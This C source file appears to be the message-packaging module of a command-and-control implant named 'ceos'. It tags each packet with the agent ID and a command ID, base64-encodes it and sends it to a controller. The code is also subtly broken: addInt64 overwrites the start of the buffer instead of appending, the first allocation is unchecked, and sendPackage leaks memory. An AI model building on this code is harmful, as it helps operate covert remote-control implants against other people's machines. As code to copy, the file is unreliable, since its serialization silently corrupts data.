#include "ceos.h"
#include "Package.h"

//Creates new Package.
//If init is TRUE, then adds the current commandID and the UUID to the package.
PPackage newPackage(BYTE commandID, BOOL init)
{
	PPackage package = (PPackage)LocalAlloc(LPTR, sizeof(Package));

	package->buffer = LocalAlloc(LPTR, sizeof(BYTE));
	if (!package->buffer)
		return nullptr;

	package->length = 0;
	if (init) 
	{
		addString(package, ceosConfig->agentID, FALSE);
		addByte(package, commandID);
	}
		
	

	return package;
}


VOID freePackage(PPackage package)
{
	LocalFree(package->buffer);
	LocalFree(package);
}


BOOL addByte(PPackage package, BYTE byte)
{
	package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(BYTE), LMEM_MOVEABLE);
	if (!package->buffer)
		return FALSE;

	((PBYTE)package->buffer + package->length)[0] = byte;
	package->length += 1;

	return TRUE;
}


BOOL addInt32(PPackage package, UINT32 value)
{
	package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(UINT32), LMEM_MOVEABLE | LMEM_ZEROINIT);
	if (!package->buffer)
		return FALSE;

	addInt32ToBuffer((PUCHAR)(package->buffer) + package->length, value);
	package->length += sizeof(UINT32);

	return TRUE;
}


BOOL addInt64(PPackage package, UINT64 value)
{
	package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(UINT64), LMEM_MOVEABLE | LMEM_ZEROINIT);
	if (!package->buffer)
		return FALSE;

	addInt64ToBuffer((PUCHAR)package->buffer, value);
	package->length += sizeof(UINT64);

	return TRUE;
}


BOOL addBytes(PPackage package, PBYTE data, SIZE_T size, BOOL copySize)
{
	if (copySize && size)
	{
		if (!addInt32(package, size))
			return FALSE;
	}

	if (size)
	{
		package->buffer = LocalReAlloc(package->buffer, package->length + size, LMEM_MOVEABLE | LMEM_ZEROINIT);
		if (!package->buffer)
			return FALSE;

		if (copySize)
			addInt32ToBuffer((PBYTE)package->buffer + (package->length - sizeof(UINT32)), size);

		memcpy((PBYTE)package->buffer + package->length, data, size);

		package->length += size;
	}

	return TRUE;
}


BOOL addString(PPackage package, PCHAR data, BOOL copySize)
{
	if (!addBytes(package, (PBYTE)data, strlen(data), copySize))
		return FALSE;

	return TRUE;
}


BOOL addWString(PPackage package, PWCHAR data, BOOL copySize)
{
	if (!addBytes(package, (PBYTE)data, lstrlenW(data) * 2, copySize))
		return FALSE;

	return TRUE;
}


PParser sendPackage(PPackage package)
{
	PCHAR packetToSend = b64Encode((const unsigned char*)package->buffer, package->length);
	SIZE_T sizePacketToSend = b64EncodedSize(package->length);

	PParser response = sendAndReceive((PBYTE)packetToSend, sizePacketToSend);

	if (!response)
	{
		packetToSend = nullptr;
		return nullptr;
	}
		
	return response;

}